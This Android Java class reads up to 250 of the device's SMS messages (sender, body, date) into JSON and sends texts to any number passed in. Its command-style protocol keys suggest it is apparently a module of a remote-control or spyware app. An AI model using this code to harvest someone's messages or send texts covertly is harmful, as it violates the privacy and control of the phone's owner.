package com.fason.app.features.sms;

import android.Manifest;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.telephony.SmsManager;
import android.text.TextUtils;

import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.permissions.PermissionManager;

import org.json.JSONArray;
import org.json.JSONObject;

public final class SMSManager {

    private static final Uri SMS_URI = Uri.parse("content://sms/");
    private static final int MAX = 250;

    private SMSManager() {}

    public static JSONObject get() {
        JSONObject result = new JSONObject();
        JSONArray list = new JSONArray();

        try {
            result.put(Protocol.KEY_SMS_LIST, list);

            if (!PermissionManager.canIUse(Manifest.permission.READ_SMS)) {
                result.put(Protocol.KEY_ERROR, "Permission denied");
                return result;
            }

            Cursor cur = FasonApp.getContext().getContentResolver().query(
                SMS_URI,
                new String[]{Protocol.KEY_ADDRESS, Protocol.KEY_BODY, Protocol.KEY_DATE, Protocol.KEY_READ, Protocol.KEY_TYPE},
                null, null, Protocol.KEY_DATE + " DESC");

            if (cur != null) {
                try {
                    int addrIdx = cur.getColumnIndex(Protocol.KEY_ADDRESS);
                    int bodyIdx = cur.getColumnIndex(Protocol.KEY_BODY);
                    int dateIdx = cur.getColumnIndex(Protocol.KEY_DATE);
                    int readIdx = cur.getColumnIndex(Protocol.KEY_READ);
                    int typeIdx = cur.getColumnIndex(Protocol.KEY_TYPE);
                    int count = 0;

                    while (cur.moveToNext() && count < MAX) {
                        JSONObject sms = new JSONObject();
                        sms.put(Protocol.KEY_ADDRESS, addrIdx >= 0 ? cur.getString(addrIdx) : "");
                        sms.put(Protocol.KEY_BODY, bodyIdx >= 0 ? cur.getString(bodyIdx) : "");
                        sms.put(Protocol.KEY_DATE, dateIdx >= 0 ? cur.getString(dateIdx) : "");
                        sms.put(Protocol.KEY_READ, readIdx >= 0 ? cur.getString(readIdx) : "");
                        sms.put(Protocol.KEY_TYPE, typeIdx >= 0 ? cur.getString(typeIdx) : "");
                        list.put(sms);
                        count++;
                    }
                } finally {
                    cur.close();
                }
            }
            result.put(Protocol.KEY_TOTAL, list.length());
        } catch (Exception ignored) {}

        return result;
    }

    public static JSONObject send(String phone, String msg) {
        JSONObject result = new JSONObject();
        try {
            result.put(Protocol.KEY_ACTION, Protocol.ACT_SEND_SMS);

            if (TextUtils.isEmpty(phone) || TextUtils.isEmpty(msg)) {
                result.put(Protocol.KEY_ERROR, "Invalid phone or message");
                return result;
            }

            if (!PermissionManager.canIUse(Manifest.permission.SEND_SMS)) {
                result.put(Protocol.KEY_ERROR, "Permission denied");
                return result;
            }

            try {
                SmsManager smsManager;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    smsManager = FasonApp.getContext().getSystemService(SmsManager.class);
                } else {
                    smsManager = SmsManager.getDefault();
                }
                smsManager.sendTextMessage(phone, null, msg, null, null);
                result.put(Protocol.KEY_SUCCESS, true);
                result.put(Protocol.KEY_TO, phone);
            } catch (Exception e) {
                result.put(Protocol.KEY_ERROR, e.getMessage());
            }
        } catch (Exception ignored) {}

        return result;
    }
}
